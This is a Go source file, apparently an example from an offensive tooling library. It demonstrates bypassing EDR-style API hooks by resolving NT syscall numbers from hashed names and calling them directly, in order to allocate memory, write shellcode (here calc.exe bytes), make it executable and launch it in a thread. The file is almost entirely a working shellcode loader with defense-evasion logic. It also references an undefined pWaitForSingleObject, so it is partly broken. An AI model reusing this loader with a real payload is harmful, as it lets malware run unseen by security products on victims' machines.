package main

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	"github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
)

var shellcode = []byte{
	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	0xd7,
}
//hook test from bananaphone
//https://github.com/C-Sto/BananaPhone/tree/master/example/testhook

func main() {
	kernel32DLL := windows.NewLazySystemDLL("kernel32.dll")
	VirtualProtectEx := kernel32DLL.NewProc("VirtualProtectEx")

	mess, _,e := gabh.MemFuncPtr("ntdll.dll",Sha256Hex("NtCreateThreadEx"),Sha256Hex)
	fmt.Printf("%x\n", mess)
	if e != nil {
		panic(e)
	}

	oldProtect := windows.PAGE_EXECUTE_READ
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(0xffffffffffffffff), uintptr(mess), uintptr(0x100), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		fmt.Printf("[!] Error on VirtualProtect:", errVirtualProtectEx, "\n")
		return
	}
	//overwrite in memory function bits to try and trigger bp to do smarts
	WriteMemory([]byte{0x90, 0x90, 0x4c, 0x8b, 0xd1, 0xb8, 0xc1, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}, uintptr(mess))

	fmt.Println("Messed up the NTCreateThreadEx function, gl launching calc!")
	//resolve the functions and extract the syscalls
	alloc,e := gabh.MemHgate(str2sha1("NtAllocateVirtualMemory"),str2sha1)
	if e != nil {
		panic(e)
	}
	protect,e := gabh.DiskHgate(Sha256Hex("NtProtectVirtualMemory"),Sha256Hex)
	if e != nil {
		panic(e)
	}

	createthread,e := gabh.MemHgate(Sha256Hex("NtCreateThreadEx"),Sha256Hex)
	if e != nil {
		panic(e)
	}

	fmt.Printf("You seem to have bypassed a hooked function... congrats (sys ID is: %d)", createthread)

	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
}


func WriteMemory(inbuf []byte, destination uintptr) {
	for index := uint32(0); index < uint32(len(inbuf)); index++ {
		writePtr := unsafe.Pointer(destination + uintptr(index))
		v := (*byte)(writePtr)
		*v = inbuf[index]
	}
}

func str2sha1(s string) string{
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string)string{
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte)[]byte{
	digest:=sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}


func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := gabh.HgSyscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	//write memory
	WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	r1, r = gabh.HgSyscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = gabh.HgSyscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}
